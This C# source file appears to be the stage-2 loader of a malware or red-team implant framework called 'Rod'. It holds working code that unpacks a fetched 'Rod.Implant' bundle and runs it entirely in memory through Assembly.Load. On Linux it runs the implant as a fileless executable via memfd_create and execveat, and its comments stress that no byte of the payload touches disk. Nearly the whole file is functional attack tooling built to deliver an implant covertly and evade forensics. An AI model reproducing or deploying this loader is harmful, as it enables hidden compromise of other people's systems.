using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Rod.Stager;

// The stage-2 execution halves of the loader, split by the fetched artifact's
// baked format. The dll bundle is hosted in this process entirely in memory:
// no byte of the stage-2 touches any filesystem. The executable forms run as
// a child process -- from memory on Linux (the bytes live in a memfd and
// execveat turns this process into the stage-2), from a temp file only where
// the OS offers no in-memory exec (Windows, pre-3.17 kernels).
internal static class Stage2Loader
{
    // Runs a dll-format stage-2 bundle in this process. The bundle's zip is
    // unpacked into memory, every dependency assembly is pre-loaded, and the
    // entry assembly's entry point is invoked in this process -- the stage-2
    // runs as a citizen of the loader's own runtime, so a .NET 10 loader
    // hosts the net8.0 bundle and waits out its run.
    public static async Task<int> RunDllAsync(byte[] bundle, CancellationToken cancellationToken)
    {
#if ROD_NATIVE_AOT
        // Unreachable by construction: the build pipeline refuses an AOT
        // stager paired with a dll stage-2 (a native host cannot load IL),
        // both at parse time and inside the build unit. The refusal here is
        // the backstop for a hand-baked profile.
        throw new InvalidOperationException("a native-AOT stager cannot host a dll stage-2");
#else
        var assemblies = new Dictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase);
        using (var archive = new ZipArchive(new MemoryStream(bundle)))
        {
            foreach (var entry in archive.Entries)
            {
                if (!entry.Name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    continue;
                using var copy = new MemoryStream();
                await entry.Open().CopyToAsync(copy, cancellationToken);
                assemblies[entry.Name] = copy.ToArray();
            }
        }

        // Resolution never reaches disk: every assembly the bundle carries is
        // loaded from its bytes, and the resolve hook serves any reference the
        // pre-load pass did not cover (a dependency first touched lazily).
        var loaded = new Dictionary<string, Assembly>(StringComparer.OrdinalIgnoreCase);
        Assembly? LoadNamed(string? name)
        {
            if (name is null)
                return null;
            if (loaded.TryGetValue(name, out var cached))
                return cached;
            if (!assemblies.TryGetValue(name + ".dll", out var bytes))
                return null;
            var assembly = Assembly.Load(bytes);
            loaded[name] = assembly;
            return assembly;
        }

        ResolveEventHandler resolveFromBundle = (_, e) => LoadNamed(new AssemblyName(e.Name).Name);
        AppDomain.CurrentDomain.AssemblyResolve += resolveFromBundle;
        try
        {
            // Dependencies first, in a stable order, so the entry assembly's
            // first use finds everything already loaded.
            foreach (var file in assemblies.Keys.OrderBy(n => n, StringComparer.OrdinalIgnoreCase))
            {
                if (!file.Equals("Rod.Implant.dll", StringComparison.OrdinalIgnoreCase))
                    LoadNamed(Path.GetFileNameWithoutExtension(file));
            }

            var entry = LoadNamed("Rod.Implant")
                ?? throw new InvalidOperationException("the stage-2 bundle carries no Rod.Implant.dll");
            var main = entry.EntryPoint
                ?? throw new InvalidOperationException("the stage-2 assembly has no entry point");
            var arguments = main.GetParameters().Length == 0
                ? Array.Empty<object>()
                : new object[] { Array.Empty<string>() };
            switch (main.Invoke(null, arguments))
            {
                case Task<int> exit:
                    return await exit.WaitAsync(cancellationToken);
                case Task task:
                    await task.WaitAsync(cancellationToken);
                    return 0;
                case int code:
                    return code;
                default:
                    return 0;
            }
        }
        finally
        {
            AppDomain.CurrentDomain.AssemblyResolve -= resolveFromBundle;
        }
#endif
    }

    // Runs the fetched executable-form stage-2 on Linux without landing it:
    // the bytes are written to an anonymous file (memfd_create(2)) and
    // execveat(2) with AT_EMPTY_PATH replaces this process with the stage-2,
    // fd as its executable. Both are documented kernel facilities; the
    // stage-2 exists only in memory. Success never returns -- the loader
    // process IS the stage-2 from the exec on, and its exit code is what the
    // parent observes.
    public static void RunMemfd(byte[] stage2)
    {
        if (!OperatingSystem.IsLinux())
            throw new PlatformNotSupportedException("memfd execution is Linux-only");

        var fd = memfd_create("rod-stage2", 0u);
        if (fd < 0)
            throw new InvalidOperationException("memfd_create failed");
        try
        {
            var written = write(fd, stage2, (ulong)stage2.Length);
            if (written != stage2.Length)
                throw new InvalidOperationException($"memfd write wrote {written} of {stage2.Length} bytes");

            // execveat replaces the process image; argv names the stage-2 the
            // way a shell would show it, envp carries the loader's own
            // environment (nothing operational rides it -- the bake carries
            // all of that). Only a failed exec returns.
            var argv = new[] { "Rod.Implant" };
            var env = Environment.GetEnvironmentVariables();
            var envp = new string[env.Count];
            var i = 0;
            foreach (System.Collections.DictionaryEntry kv in env)
                envp[i++] = kv.Key + "=" + kv.Value;
            execveat(fd, "", argv, envp, AtEmptyPath);
            throw new InvalidOperationException("execveat failed");
        }
        finally
        {
            // Reached only on the failure path; a successful exec never
            // returns and the kernel owns the fd from there.
            close(fd);
        }
    }

    private const int AtEmptyPath = 0x1000;

    [DllImport("libc", SetLastError = true)]
    private static extern int memfd_create(string name, uint flags);

    [DllImport("libc", SetLastError = true)]
    private static extern long write(int fd, byte[] buffer, ulong count);

    [DllImport("libc", SetLastError = true)]
    private static extern int execveat(int dirfd, string pathname, string[] argv, string[] envp, int flags);

    [DllImport("libc")]
    private static extern int close(int fd);
}
